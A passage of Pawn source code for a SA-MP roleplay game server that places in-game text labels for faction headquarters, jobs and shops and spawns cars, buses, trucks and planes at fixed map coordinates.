    CreateDynamic3DTextLabel("Los Santos Police Departament\n Type: /enter to enter",COLOR_GRAD4,1554.9537,-1675.6584,16.1953,10.0);//LSPD HQ AFARA
    CreateDynamic3DTextLabel("Federal Bureau of Investigation\n Type: /enter to enter",COLOR_GRAD4,2287.0576,2432.1121,10.8203,10.0);//EBI
    CreateDynamic3DTextLabel("The Dangerous Tigers Family\n Type: /enter to enter",COLOR_GRAD4,2637.4326,2352.0256,10.8203,10.0);//Dangerous Tigers
    CreateDynamic3DTextLabel("The Killers Family\n Type: /enter to enter",COLOR_GRAD4,1456.7424,2773.4614,10.8203,10.0);//StormMen
    CreateDynamic3DTextLabel("San Fiero Police Departament / Enter In : Parking",COLOR_GRAD4,-1605.513793,710.273010,13.867187,10.0);//SFPD Jelosh
    CreateDynamic3DTextLabel("The Racers Family\n Type: /enter to enter",COLOR_GRAD4,-2720.359619,-318.036743,7.843750 ,10.0);//TopBoys
    CreateDynamic3DTextLabel("The Fast N Furious Family\n Type: /enter to enter",COLOR_GRAD4,1455.4546,750.9794,11.0234 ,10.0);//FNF
    CreateDynamic3DTextLabel("Silence Mafia\n Type: /enter to enter",COLOR_GRAD4,725.5550,-1451.0232,17.6953,10.0);//Silence Mafia
    CreateDynamic3DTextLabel("The Legendary Men Family\n Type: /enter to enter",COLOR_GRAD4,1122.7065,-2037.0063,69.8942,10.0);//The Killers
    CreateDynamic3DTextLabel("[TT] Clan Family",COLOR_GRAD4,2232.425537,-1159.585205,25.890625,10.0);//TT
    CreateDynamic3DTextLabel("Evil Clan Family",COLOR_GRAD4,2140.929199,-1801.968017,16.147472,10.0);//Evil
    CreateDynamic3DTextLabel("Baraye Paiin Raftan Bezan : /down",COLOR_GRAD4,2235.440429,-1184.549194,33.531250,10.0);//TT
    CreateDynamic3DTextLabel("Baraye Bala Raftan Bezan : /up",COLOR_GRAD4,2218.994628,-1179.321777,25.890625,10.0);//TT
    CreateDynamic3DTextLabel("[GG] Clan Family",COLOR_GRAD4,1653.836059,-1654.757690,22.515625,10.0);//GG (edit)
    CreateDynamic3DTextLabel("Baraye Bala Raftan Bezan : /up",COLOR_GRAD4,1649.305664,-1656.475585,22.515625,10.0);//GG (edit)
    CreateDynamic3DTextLabel("Baraye Paiin Raftan Bezan : /down",COLOR_GRAD4,1654.223388,-1643.526855,83.781250,10.0);//GG (edit)
    CreateDynamic3DTextLabel("Baraye Bala Raftan Bezan : /up",COLOR_GRAD4,2793.181152,-1080.431518,30.718750,10.0);//Strm
    CreateDynamic3DTextLabel("Baraye Paiin Raftan Bezan : /down",COLOR_GRAD4,2790.662597,-1088.139526,94.187072,10.0);//Strm
    CreateDynamic3DTextLabel("Baraye Bala Raftan Bezan : /up",COLOR_GRAD4,-1606.268066,672.061706,-4.906250,10.0);//SFPD
    CreateDynamic3DTextLabel("Baraye Paiin Raftan Bezan : /down",COLOR_GRAD4,-1639.474853,716.886535,48.937500,10.0);//SFPD
    CreateDynamic3DTextLabel("Staff Family\n Type: /enter to enter",COLOR_GRAD4,2560.805175,1561.846069,10.820312,10.0);//Staff
    CreateDynamic3DTextLabel("Jail Yard\n Type /enterjail for enter to jail",COLOR_GRAD4, 193.368545, 1931.499145, 17.640625,10.0);//yard/exit
    CreateDynamic3DTextLabel("The Storm Men Family\n Type: /enter to enter", COLOR_GRAD4, 2792.800292, -1087.528320, 30.718750, 10);
    CreateDynamic3DTextLabel("Hitman Agency\n Type: /enter to enter",COLOR_GRAD4,1080.997192,-345.408233,73.984069,10.0);//Hitman
    CreateDynamic3DTextLabel("Taxi Cab Company\n Type: /enter to enter",COLOR_GRAD4,937.3935,1733.2067,8.8516,10.0);//TAXI
    //============================================[jobs]======================================================
    CreateDynamic3DTextLabel("You Can Become a Detective \n use /getjob to join",COLOR_JOB,359.5408,206.7693,1008.3828,12.0);//detective
    CreateDynamic3DTextLabel("You Can Become a lawyer \n use /getjob to join",COLOR_JOB,362.0605,173.7425,1008.3828,12.0);//lawyer
    CreateDynamic3DTextLabel("You Can Become a Drugs Dealer \n use /getjob to join",COLOR_JOB,323.507873,1117.880981,1083.882812,12.0);
    CreateDynamic3DTextLabel("You Can Become a Car Jacker \n use /getjob to join",COLOR_JOB,2515.572265,-1473.751220,24.009740,10.0);//car jacker
    CreateDynamic3DTextLabel("You Can Become a Car Mechanic \n use /getjob to join",COLOR_JOB,1658.4885,2199.7075,10.8203,10.0);//Car Mechanic
    CreateDynamic3DTextLabel("You Can Become a Bus Driver \n use /getjob to join",COLOR_JOB,1765.061889,-2031.958862,14.048107,10.0);//Bus Driver
    CreateDynamic3DTextLabel("You Can Become a Bus Driver \n use /getjob to join",COLOR_JOB,1909.430297,2351.376453,10.979915,10.0);
    CreateDynamic3DTextLabel("You Can Become a Trucker \n use /getjob to join",COLOR_JOB,-77.235397,-1136.455932,1.078125,10.0);
    CreateDynamic3DTextLabel("You Can Become a Farmer \n use /getjob to join",COLOR_JOB,-1061.110107,-1195.576660,129.728820,10.0);
    CreateDynamic3DTextLabel("You Can Become a Farmer \n use /getjob to join",COLOR_JOB,-382.6660,-1426.5121,26.2410,10.0);
    CreateDynamic3DTextLabel("You Can Become a Arms Dealer \n use /getjob to join",COLOR_JOB,2440.481201,-1970.118164,13.546875,10.0);
    CreateDynamic3DTextLabel("You Can Become a Garbage man \n use /getjob to join",COLOR_JOB,2077.161376,-2006.656250,13.546875,10.0);
     CreateDynamic3DTextLabel("Mikhay Ranande Sherkat Shi Bezan \n use /getjob ",COLOR_JOB,1612.7501,-1839.9008,13.5223,10.0);
    //////========================================================================
    CreateDynamic3DTextLabel("Welcome\nType: /eat to eat", COLOR_WHITE, 368.9714,-6.2486,1001.8516, 10);
    CreateDynamic3DTextLabel("Welcome\nType: /Atmwithdraw to money", COLOR_WHITE, 308.0,-141.461181,999.601562, 10);
    CreateDynamic3DTextLabel("Welcome\nType: /eat to eat", COLOR_WHITE, 313.977355,-138.886062,1004.062500, 10);
    CreateDynamic3DTextLabel("Welcome\nType: /eat to eat", COLOR_WHITE, 376.8571,-67.6620,1001.5151, 10);
    CreateDynamic3DTextLabel("Welcome\nType: /eat to eat", COLOR_WHITE, 375.6895,-118.9683,1001.4995, 10);
    CreateDynamic3DTextLabel("Welcome To Resturant\nType: /eat to eat", COLOR_WHITE, -787.565551,500.073822,1371.742187, 8);
    CreateDynamic3DTextLabel("Welcome\nType: /eat to eat", COLOR_WHITE, 379.0611,-186.6032,1000.6328, 10);
    CreateDynamic3DTextLabel("Fire & Meidc Department HQ\n type /enter to enter.", COLOR_WHITE, 1607.520996,1815.756591,10.820312, 10);
    CreateDynamic3DTextLabel("News Reporter HQ\n type /enter to enter.",COLOR_WHITE,-329.770111,1536.920532,76.611709, 10);
    //========================[vehicles]===========================================================================
    AddStaticVehicleEx(522,2229.60009766,1413.16210938,10.72287750,270.00000000,-1,-1,900); //NRG-500 LV Moto 184
    AddStaticVehicleEx(522,2229.52685547,1408.98999023,10.72287750,270.00000000,-1,-1,900); //NRG-500 LV Moto 185
    AddStaticVehicleEx(522,2229.61621094,1404.94372559,10.72287750,270.00000000,-1,-1,900); //NRG-500 LV Moto 186
    AddStaticVehicleEx(516,1921.80004883,1728.24890137,12.61440086,0.00000000,-1,-1,900); //Nebula LV Car 187
    AddStaticVehicleEx(542,1928.09191895,1760.85363770,18.74798584,0.00000000,-1,-1,900); //Clover LV Car 188
    AddStaticVehicleEx(439,1885.50061035,1817.23571777,18.93387794,0.00000000,-1,-1,900); //Stallion LV Car 189
    AddStaticVehicleEx(439,1907.42065430,2057.51000977,10.82031250,0.00000000,-1,-1,900); //Stallion LV Car 190
    AddStaticVehicleEx(516,1709.81347656,2243.56469727,10.72031212,0.00000000,-1,-1,900); //Nebula LV Car 191
    AddStaticVehicleEx(542,1536.02441406,2258.47583008,10.66371059,0.00000000,-1,-1,900); //Clover LV Car 192
    AddStaticVehicleEx(436,1368.87951660,2273.09008789,10.69830608,270.00000000,-1,-1,900); //Previon LV Car 193
    AddStaticVehicleEx(603,2198.76538086,1810.04479980,10.82298756,0.00000000,-1,-1,900); //Phoenix LV Car 194
    AddStaticVehicleEx(603,2195.31030273,2502.80688477,10.82298756,0.00000000,-1,-1,900); //Phoenix LV Car 195
    AddStaticVehicleEx(410,2433.75683594,2529.97924805,10.57030582,0.00000000,-1,-1,900); //Manana LV Car 196
    AddStaticVehicleEx(458,1898.44738770,2435.46533203,10.79052258,179.99993896,-1,-1,900); //Solair LV Car 197
    AddStaticVehicleEx(404,1613.03149414,2217.19580078,10.65031242,90.00000000,-1,-1,900); //Perrenial LV Car 198
   // AddStaticVehicleEx(400,1978.80627441,2250.08007812,27.33142281,270.00000000,-1,-1,900); //Landstalker LV Car 199
    //AddStaticVehicleEx(400,2104.11914062,2069.34130859,10.95642281,90.00000000,-1,-1,900); //Landstalker LV Car 200
    AddStaticVehicleEx(481,1863.5966,-1395.8079,12.9957,267.0759,3,3,900); // BMX IN THE PARK
    AddStaticVehicleEx(481,1930.8707,-1449.0979,12.9764,2.2853,3,3,900); // BMX IN THE PARK
    AddStaticVehicleEx(481,1954.4668,-1372.2097,19.1633,85.9580,3,3,900); // BMX IN THE PARK
    AddStaticVehicleEx(481,1902.0961,-1352.1694,12.9806,88.9301,3,3,90); // BMX IN THE PARK
    AddStaticVehicleEx(550,981.57379150,-924.02593994,41.47120285,268.00000000,-1,-1,900); //Sunrise LS CaRsS
    AddStaticVehicleEx(603,1179.62573242,-926.63281250,43.17923737,280.00000000,-1,-1,900); //Phoenix LS CaRsS
    AddStaticVehicleEx(436,1318.32727051,-873.88653564,39.45611954,0.00000000,-1,-1,900); //Previon LS CaRsS
    AddStaticVehicleEx(496,1571.71398926,-1011.14837646,23.69397736,179.99993896,-1,-1,900); //Blista Compact LS CaRsS
    AddStaticVehicleEx(439,1616.55883789,-1128.10290527,23.90625000,270.00000000,-1,-1,900); //Stallion LS CaRsS
    AddStaticVehicleEx(542,1749.04223633,-1085.04052734,23.80433655,0.00000000,-1,-1,900); //Clover LS CaRsS
    AddStaticVehicleEx(466,1757.27648926,-1014.99871826,23.88093758,167.99993896,-1,-1,900); //Glendale LS CaRsS
    AddStaticVehicleEx(547,2284.81176758,-1057.92468262,48.09999847,156.00000000,-1,-1,900); //Primo LS CaRsS
    AddStaticVehicleEx(585,2604.07470703,-1060.77722168,69.28240204,0.00000000,-1,-1,900); //Emperor LS CaRsS
    AddStaticVehicleEx(603,2683.95141602,-1098.23217773,69.31613159,0.00000000,-1,-1,900); //Phoenix LS CaRsS
    AddStaticVehicleEx(549,2801.30834961,-1465.22680664,16.08302879,0.00000000,-1,-1,900); //Tampa LS CaRsS
    AddStaticVehicleEx(439,2812.87304688,-1427.90075684,20.21875000,179.99993896,-1,-1,900); //Stallion LS CaRsS
    AddStaticVehicleEx(496,2790.84228516,-1447.77734375,31.80928993,272.00000000,-1,-1,900); //Blista Compact LS CaRsS
    AddStaticVehicleEx(401,2804.13525391,-1428.04003906,39.92020416,181.99993896,-1,-1,900); //Bravura LS CaRsS
    AddStaticVehicleEx(410,2796.57714844,-1558.55053711,10.67714882,270.00000000,-1,-1,900); //Manana LS CaRsS
    AddStaticVehicleEx(439,2816.19946289,-1539.76440430,10.92187500,179.99993896,-1,-1,900); //Stallion LS CaRsS
    AddStaticVehicleEx(542,2830.94067383,-1694.63952637,9.78857040,76.00000000,-1,-1,900); //Clover LS CaRsS
    AddStaticVehicleEx(549,2695.44995117,-1838.21093750,9.31468582,147.99993896,-1,-1,900); //Tampa LS CaRsS
    AddStaticVehicleEx(603,2676.55346680,-1672.48681641,9.39862442,0.00000000,-1,-1,900); //Phoenix LS CaRsS
    AddStaticVehicleEx(424,2384.70043945,-2295.83959961,13.38855076,46.00000000,-1,-1,900); //BF Injection LS CaRsS
    AddStaticVehicleEx(424,2659.99877930,-1438.63513184,30.33583450,0.00000000,-1,-1,900); //BF Injection LS CaRsS
    AddStaticVehicleEx(561,2516.71508789,-1398.92553711,28.28337479,0.00000000,-1,-1,900); //Stratum LS CaRsS
    AddStaticVehicleEx(400,2538.59106445,-1474.19653320,24.13598061,0.00000000,-1,-1,900); //Landstalker LS CaRsS
    //AddStaticVehicleEx(516,2390.83032227,-1487.58630371,23.72812462,270.00000000,-1,-1,900); //Nebula LS CaRsS
    AddStaticVehicleEx(439,2443.05126953,-1646.23400879,13.47888184,177.99993896,-1,-1,900); //Stallion LS CaRsS
    AddStaticVehicleEx(401,2296.66699219,-1645.76879883,14.65782547,0.00000000,-1,-1,900); //Bravura LS CaRsS
    AddStaticVehicleEx(603,2357.38208008,-1478.11877441,23.83399200,90.00000000,-1,-1,900); //Phoenix LS CaRsS
    AddStaticVehicleEx(401,2490.39086914,-1755.15039062,13.38499832,0.00000000,-1,-1,900); //Bravura LS CaRsS
    AddStaticVehicleEx(410,1923.85742188,-1794.66857910,13.13280582,0.00000000,-1,-1,900); //Manana LS CaRsS
    AddStaticVehicleEx(481,1734.03173828,-1864.95800781,13.18199444,0.00000000,-1,-1,900); //BMX LS CaRsS GaRa
    AddStaticVehicleEx(481,1733.03222656,-1864.99755859,13.18199444,0.00000000,-1,-1,900); //BMX LS CaRsS GaRa
    AddStaticVehicleEx(481,1732.03320312,-1865.03662109,13.18199444,0.00000000,-1,-1,900); //BMX LS CaRsS GaRa
    AddStaticVehicleEx(481,1730.78442383,-1865.01855469,13.18199444,0.00000000,-1,-1,900); //BMX LS CaRsS GaRa
    AddStaticVehicleEx(481,1729.53540039,-1865.02343750,13.18199444,0.00000000,-1,-1,900); //BMX LS CaRsS GaRa
    AddStaticVehicleEx(481,1728.04138184,-1869.27563477,13.18199444,0.00000000,-1,-1,900); //BMX LS CaRsS GaRa
    AddStaticVehicleEx(561,1977.72460938,-1995.69555664,13.47790146,0.00000000,-1,-1,900); //Stratum LS CaRsS
    AddStaticVehicleEx(401,1947.43566895,-2117.33129883,13.41247559,270.00000000,-1,-1,900); //Bravura LS CaRsS
    AddStaticVehicleEx(547,1616.24291992,-1894.59570312,13.38850975,0.00000000,-1,-1,900); //Primo LS CaRsS
  //  AddStaticVehicleEx(400,1244.24023438,-1835.06677246,13.52621269,0.00000000,-1,-1,900); //Landstalker LS CaRsS
    AddStaticVehicleEx(496,1398.02685547,-2330.92822266,13.33460236,0.00000000,-1,-1,900); //Blista Compact LS CaRsS
    AddStaticVehicleEx(439,1411.38476562,-2208.47583008,13.53907013,179.99993896,-1,-1,900); //Stallion LS CaRsS
    AddStaticVehicleEx(466,1560.23913574,-2247.74121094,13.46687508,90.00000000,-1,-1,900); //Glendale LS CaRsS
    AddStaticVehicleEx(585,1546.20446777,-2360.92700195,13.25158119,0.00000000,-1,-1,900); //Emperor LS CaRsS
    AddStaticVehicleEx(404,1063.02050781,-1769.72534180,13.19865608,270.00000000,-1,-1,900); //Perrenial LS CaRsS
    AddStaticVehicleEx(561,1359.54968262,-1753.12182617,13.28838921,0.00000000,-1,-1,900); //Stratum LS CaRsS
  //  AddStaticVehicleEx(400,1283.82397461,-1523.51867676,13.69818687,266.00000000,-1,-1,900); //Landstalker LS CaRsS
    AddStaticVehicleEx(458,782.55749512,-1605.42004395,13.35302258,270.00000000,-1,-1,900); //Solair LS CaRsS
    AddStaticVehicleEx(424,449.92453003,-1812.25061035,5.39410114,0.00000000,-1,-1,900); //BF Injection LS CaRsS
    AddStaticVehicleEx(424,445.64688110,-1812.10864258,5.39410114,0.00000000,-1,-1,900); //BF Injection LS CaRsS
    AddStaticVehicleEx(410,337.25863647,-1809.49926758,4.25713730,0.00000000,-1,-1,900); //Manana LS CaRsS
    AddStaticVehicleEx(603,303.98684692,-1486.54162598,24.59642410,236.00000000,-1,-1,900); //Phoenix LS CaRsS
    AddStaticVehicleEx(436,203.36660767,-1445.93811035,12.95622349,320.00000000,-1,-1,900); //Previon LS CaRsS
    AddStaticVehicleEx(527,-74.44380188,-1153.73107910,1.53314853,152.00000000,-1,-1,900); //Cadrona LS CaRsS
    AddStaticVehicleEx(527,-398.57284546,-1435.63757324,25.50971031,182.00000000,-1,-1,900); //Cadrona LS CaRsS
    AddStaticVehicleEx(568,-2348.12768555,-1611.80493164,483.86505127,250.00000000,-1,-1,900); //Duneride LS CaRsS ---- 278
    AddStaticVehicleEx(467,-2147.04614258,-2444.00024414,30.49500084,322.00000000,-1,-1,900); //Oceanic LS CaRsS
    AddStaticVehicleEx(540,-2230.88574219,-2325.96728516,30.59198761,316.00000000,-1,-1,900); //Vincent LS CaRsS
    AddStaticVehicleEx(561,-1545.30114746,-2748.86645508,48.45981216,170.00000000,-1,-1,900); //Stratum LS CaRsS
    AddStaticVehicleEx(458,20.20413208,-2634.07641602,40.37627792,0.00000000,-1,-1,900); //Solair LS CaRsS
    AddStaticVehicleEx(458,667.24420166,-546.33233643,16.30614662,90.00000000,-1,-1,900); //Solair LS CaRsS
  //  AddStaticVehicleEx(400,708.87915039,-461.27371216,16.47204781,90.00000000,-1,-1,900); //Landstalker LS CaRsS
    AddStaticVehicleEx(549,2229.2122,-1345.3350,23.6886,92.6004,-1,-1,900); // LS car
    AddStaticVehicleEx(458,2485.5276,-1556.1805,23.9130,178.8331,-1,-1,900); // LS car
    AddStaticVehicleEx(547,2472.3152,1990.9030,10.5559,359.6977,-1,-1,900); // Primo LV
    AddStaticVehicleEx(400,1672.9822,1306.0332,10.9127,359.5630,-1,-1,900); // Lanscaker geep LV
   /*----------------------------------------------------------------------------*///
    AddStaticVehicleEx(540,-290.51672363,1312.78967285,54.13595963,82.00000000,-1,-1,900); //Vincent LV pe acolo pe la HQ NR
    AddStaticVehicleEx(547,-136.15957642,1084.88488770,19.58218765,0.00000000,-1,-1,900); //Primo LV pe acolo pe la HQ NR
    AddStaticVehicleEx(603,-80.74277496,1076.99609375,19.74486160,0.00000000,-1,-1,900); //Phoenix LV pe acolo pe la HQ NR
    AddStaticVehicleEx(439,49.50638580,1157.23657227,18.66406250,0.00000000,-1,-1,900); //Stallion LV pe acolo pe la HQ NR
    AddStaticVehicleEx(466,-177.68984985,1225.22192383,19.66218758,270.00000000,-1,-1,900); //Glendale LV pe acolo pe la HQ NR
    AddStaticVehicleEx(547,-866.84667969,1551.02478027,23.17987061,270.00000000,-1,-1,900); //Primo LV pe acolo pe la HQ NR
    AddStaticVehicleEx(585,-842.47747803,1472.69921875,16.24203873,356.00000000,-1,-1,900); //Emperor LV pe acolo pe la HQ NR
    //AddStaticVehicleEx(400,-740.89874268,1645.99145508,27.42869377,180.00000000,-1,-1,900); //Landstalker LV pe acolo pe la HQ NR
    AddStaticVehicleEx(404,-1193.89099121,1822.19140625,41.54875183,44.00000000,-1,-1,900); //Perrenial LV pe acolo pe la HQ NR
    AddStaticVehicleEx(561,-1399.85607910,2643.90405273,55.61149979,90.00000000,-1,-1,900); //Stratum LV pe acolo pe la HQ NR
    AddStaticVehicleEx(561,-1488.97167969,1878.04736328,32.55681229,6.00000000,-1,-1,900); //Stratum LV pe acolo pe la HQ NR
    AddStaticVehicleEx(561,-941.23315430,1417.73669434,30.01502228,270.00000000,-1,-1,900); //Stratum LV pe acolo pe la HQ NR
    AddStaticVehicleEx(561,155.18121338,1190.52490234,15.32431507,0.00000000,-1,-1,900); //Stratum LV pe acolo pe la HQ NR
    AddStaticVehicleEx(400,651.64892578,1700.78771973,7.12829828,132.00000000,-1,-1,900); //Landstalker LV pe acolo pe la HQ NR
   // AddStaticVehicleEx(410,711.44122314,1949.45092773,5.28905535,180.00000000,-1,-1,900); //Manana LV pe acolo pe la HQ NR
    AddStaticVehicleEx(585,-220.79730225,2730.07446289,62.38442612,0.00000000,-1,-1,900); //Emperor LV pe acolo pe la HQ NR
    AddStaticVehicleEx(547,-929.67852783,2015.40197754,60.75406265,308.00000000,-1,-1,900); //Primo LV pe acolo pe la HQ NR
    AddStaticVehicleEx(542,-301.58459473,1777.36718750,42.53089905,270.00000000,-1,-1,900); //Clover LV pe acolo pe la HQ NR
    AddStaticVehicleEx(561,2257.36035156,-82.79073334,26.45272827,179.99993896,-1,-1,900); //Stratum LV Car
    AddStaticVehicleEx(439,1929.18994141,698.20684814,10.82031250,180.00000000,-1,-1,900); //Stallion LV Car
    AddStaticVehicleEx(527,2804.50854492,1329.39758301,10.54076862,270.00000000,-1,-1,900); //Cadrona LV Car
    AddStaticVehicleEx(549,2879.48999023,2436.20800781,10.68178940,224.00000000,-1,-1,900); //Tampa LV Car
    AddStaticVehicleEx(466,2780.28466797,2440.19946289,10.74031258,134.00000000,-1,-1,900); //Glendale LV Car
    AddStaticVehicleEx(550,2141.85498047,2799.28198242,10.74309444,270.00000000,-1,-1,900); //Sunrise LV Car
    AddStaticVehicleEx(561,1368.97680664,2648.76562500,10.74431229,0.00000000,-1,-1,900); //Stratum LV Car
    AddStaticVehicleEx(550,1270.00366211,2694.45922852,10.74309444,179.99993896,-1,-1,900); //Sunrise LV Car
    AddStaticVehicleEx(404,1328.80847168,1279.39758301,10.65031242,0.00000000,-1,-1,900); //Perrenial LV Car
    AddStaticVehicleEx(458,1658.56518555,988.69860840,10.79052258,0.00000000,-1,-1,900); //Solair LV Car
    AddStaticVehicleEx(424,1664.87805176,1039.54394531,10.66753864,0.00000000,-1,-1,900); //BF Injection LV Car
    AddStaticVehicleEx(561,2197.08422852,938.86822510,10.74431229,0.00000000,-1,-1,900); //Stratum LV Car
    AddStaticVehicleEx(550,2501.38330078,937.03747559,10.75078106,0.00000000,-1,-1,900); //Sunrise LV Car
    AddStaticVehicleEx(542,2624.42114258,1132.63806152,10.66371059,180.00000000,-1,-1,900); //Clover LV Car
    AddStaticVehicleEx(439,2599.60009766,1690.90002441,10.82031250,90.00000000,-1,-1,900); //Stallion LV Car
    AddStaticVehicleEx(549,2562.76708984,1880.92883301,10.68369675,270.00000000,-1,-1,900); //Tampa LV Car
    AddStaticVehicleEx(527,2588.33789062,2056.74023438,10.60346127,90.00000000,-1,-1,900); //Cadrona LV Car
    AddStaticVehicleEx(410,2386.13281250,2003.82482910,10.57030582,0.00000000,-1,-1,900); //Manana LV Car
    AddStaticVehicleEx(603,2249.88159180,2063.83276367,10.82298756,180.00000000,-1,-1,900); //Phoenix LV Car
    AddStaticVehicleEx(410,2283.45288086,1975.36828613,9.61712074,0.00000000,-1,-1,900); //Manana LV Car
    AddStaticVehicleEx(401,2246.95336914,1952.12133789,31.64746666,0.00000000,-1,-1,900); //Bravura LV Car
    AddStaticVehicleEx(603,2247.34790039,1974.90893555,20.82476807,0.00000000,-1,-1,900); //Phoenix LV Ca

    tcc1 = AddStaticVehicleEx(525,864.6730,-1255.5668,14.7480,270.6490,0,102,900); //TCC towtruck  **Numar**-- 212
    tcc2 = AddStaticVehicleEx(525,864.5558,-1245.1750,14.7540,272.7823,0,102,900); //TCC towtruck  **Numar**-- 213
    tcc3 = AddStaticVehicleEx(525,867.1730,-1206.1055,16.8590,177.8868,0,102,900); //TCC towtruck   **Numar**--214
    tcc4 = AddStaticVehicleEx(525,901.3642,-1205.6709,16.8546,178.5888,0,102,900); //TCC towtruck  **Numar**-- 215
    tcc5 = AddStaticVehicleEx(525,911.8616,-1253.7588,15.5698,0.3719,0,102,900); //TCC towtruck   **Numar**--216
    tcc6 = AddStaticVehicleEx(552,900.2590,-1272.3209,14.3154,91.9758,1,102,900); //TCC utility   **Numar**--217
    //spawn civil masini
    //====================[airport airplane]=======================================
        AddStaticVehicleEx(439, 1065.2755, -1348.5320, 13.1750, 0.0000, -1, -1, 100);
    AddStaticVehicleEx(593, 1610.5841, -2625.9011, 14.0242, 0.0000, -1, -1, 100);//ls dodo 1
    AddStaticVehicleEx(593, 1624.0630, -2625.9011, 14.0242, 0.0000, -1, -1, 100);//ls dodo 2
    AddStaticVehicleEx(513, 1689.1484, -2626.5759, 14.2821, 0.0000, -1, -1, 100);//ls airport veh(its airplane but idk what is name!:D)
    AddStaticVehicleEx(513, 1679.7643, -2626.5759, 14.2821, 0.0000, -1, -1, 100);//ls airport vehits airplane but idk what is name!:D)
    AddStaticVehicleEx(519, 1290.9716, 1324.6434, 11.8289, 270.0000, -1, -1, 100);// lv shamal 1
    AddStaticVehicleEx(519, 1291.1472, 1360.9352, 11.8289, 270.0000, -1, -1, 100);// lv shamal 2
    AddStaticVehicleEx(487, 1293.9784, 1428.2620, 10.9260, 270.0000, -1, -1, 100);// lv heli 1
	//LS - Bus
    BusVeh[0] = AddStaticVehicleEx(431, 1804.7834, -2040.0323, 13.5707, 90.0000, -1, -1, 100);
    BusVeh[1] = AddStaticVehicleEx(431, 1804.7834, -2046.1958, 13.5707, 90.0000, -1, -1, 100);
    BusVeh[2] = AddStaticVehicleEx(431, 1761.8491, -2070.3650, 13.4729, 0.0000, -1, -1, 100);
    BusVeh[3] = AddStaticVehicleEx(431, 1741.4033, -2070.7446, 13.4729, 0.0000, -1, -1, 100);
    BusVeh[4] = AddStaticVehicleEx(431, 1745.9493, -2070.4456, 13.4729, 0.0000, -1, -1, 100);
    BusVeh[5] = AddStaticVehicleEx(431, 1750.8622, -2070.3757, 13.4729, 0.0000, -1, -1, 100);
    BusVeh[6] = AddStaticVehicleEx(431, 1755.7352, -2070.3928, 13.4729, 0.0000, -1, -1, 100);
    BusVeh[7] = AddStaticVehicleEx(431, 1804.7834, -2025.3192, 13.5706, 90.0000, -1, -1, 100);
    BusVeh[8] = AddStaticVehicleEx(431, 1804.7834, -2032.7922, 13.5706, 90.0000, -1, -1, 100);
	//LV - Bus
    BusVeh[9] = AddStaticVehicleEx(431, 1907.6693, 2299.5952, 10.7563, 90.0000, -1, -1, 100);
    BusVeh[10] = AddStaticVehicleEx(431, 1907.6019, 2309.7690, 10.7563, 90.0000, -1, -1, 100);
    BusVeh[11] = AddStaticVehicleEx(431, 1907.6189, 2314.9146, 10.7563, 90.0000, -1, -1, 100);
    BusVeh[12] = AddStaticVehicleEx(431, 1907.6527, 2325.1953, 10.7563, 90.0000, -1, -1, 100);
    BusVeh[13] = AddStaticVehicleEx(431, 1907.6344, 2319.6523, 10.7563, 90.0000, -1, -1, 100);
    BusVeh[14] = AddStaticVehicleEx(431, 1907.7020, 2294.7112, 10.7563, 90.0000, -1, -1, 100);
    BusVeh[15] = AddStaticVehicleEx(431, 1907.6378, 2304.3225, 10.7563, 90.0000, -1, -1, 100);
    //]]]]]]]]]]]]]]]
    //=============[TRUCKER]=====================
	TruckVeh[0] = AddStaticVehicleEx(403, -72.1261, -1108.4984, 1.7635, 159.5965, -1, -1, 100);
    TruckVeh[1] = AddStaticVehicleEx(403, -67.3388, -1110.3146, 1.7635, 159.5965, -1, -1, 100);
    TruckVeh[2] = AddStaticVehicleEx(403, -62.3663, -1112.0814, 1.7635, 159.5965, -1, -1, 100);
    TruckVeh[3] = AddStaticVehicleEx(403, -57.8158, -1114.4633, 1.7635, 159.5965, -1, -1, 100);
    TruckVeh[4] = AddStaticVehicleEx(403, -53.4444, -1116.8604, 1.7635, 159.5965, -1, -1, 100);
    TruckVeh[5] = AddStaticVehicleEx(403, -102.3571, -1107.5728, 4.3040, 157.2291, -1, -1, 100);
    TruckVeh[6] = AddStaticVehicleEx(403, -98.4245, -1109.3055, 3.4970, 157.2291, -1, -1, 100);
    TruckVeh[7] = AddStaticVehicleEx(403, -105.9842, -1105.8409, 4.6071, 157.2291, -1, -1, 100);
    TruckVeh[8] = AddStaticVehicleEx(403, -110.1259, -1103.9528, 4.9101, 157.2291, -1, -1, 100);
    TruckVeh[9] = AddStaticVehicleEx(403, -118.2273, -1099.8651, 5.2111, 157.1291, -1, -1, 100);
    TruckVeh[10] = AddStaticVehicleEx(403, -114.4838, -1101.8799, 4.9101, 157.2291, -1, -1, 100);
    TruckVeh[11] = AddStaticVehicleEx(403, -126.5405, -1095.6350, 6.0151, 157.1291, -1, -1, 100);
    TruckVeh[12] = AddStaticVehicleEx(403, -122.3481, -1097.5166, 5.4121, 157.1291, -1, -1, 100);
    TruckVeh[13] = AddStaticVehicleEx(435, -114.3811, -1142.1796, 3.3238, 330.4947, -1, -1, 100);
    TruckVeh[14] = AddStaticVehicleEx(435, -138.9563, -1128.4883, 3.9957, 330.4947, -1, -1, 100);
    TruckVeh[15] = AddStaticVehicleEx(435, -135.2275, -1130.8865, 3.6266, 330.4947, -1, -1, 100);
    TruckVeh[16] = AddStaticVehicleEx(435, -142.3163, -1126.6383, 4.4937, 330.4947, -1, -1, 100);
    TruckVeh[17] = AddStaticVehicleEx(435, -37.2202, -1129.5708, 1.7261, 64.9868, -1, -1, 100);
    TruckVeh[18] = AddStaticVehicleEx(435, -41.4786, -1138.8788, 1.7261, 64.9868, -1, -1, 100);
    TruckVeh[19] = AddStaticVehicleEx(435, -117.3456, -1140.6168, 3.3238, 330.4947, -1, -1, 100);
    TruckVeh[20] = AddStaticVehicleEx(435, -120.5708, -1138.8167, 3.4070, 330.4947, -1, -1, 100);
	TruckVeh[21] = AddStaticVehicleEx(591, -124.3185, -1137.4039, 3.4070, 330.4947, -1, -1, 100);
    TruckVeh[22] = AddStaticVehicleEx(591, -128.2775, -1136.3356, 3.4012, 330.4947, -1, -1, 100);
    TruckVeh[23] = AddStaticVehicleEx(591, -35.2477, -1125.2594, 1.7261, 64.9868, -1, -1, 100);
    TruckVeh[24] = AddStaticVehicleEx(591, -39.2540, -1134.0162, 1.7261, 64.9868, -1, -1, 100);
    TruckVeh[25] = AddStaticVehicleEx(591, -44.4853, -1144.0902, 1.7261, 64.9868, -1, -1, 100);
    TruckVeh[26] = AddStaticVehicleEx(591, -131.6808, -1133.9336, 3.3430, 330.4947, -1, -1, 100);
    //==================================[FARMER]=====================================
    FarmerVeh[0] = AddStaticVehicleEx(532,-387.4058,-1476.6927,26.7035,265.6719,0,0,900);
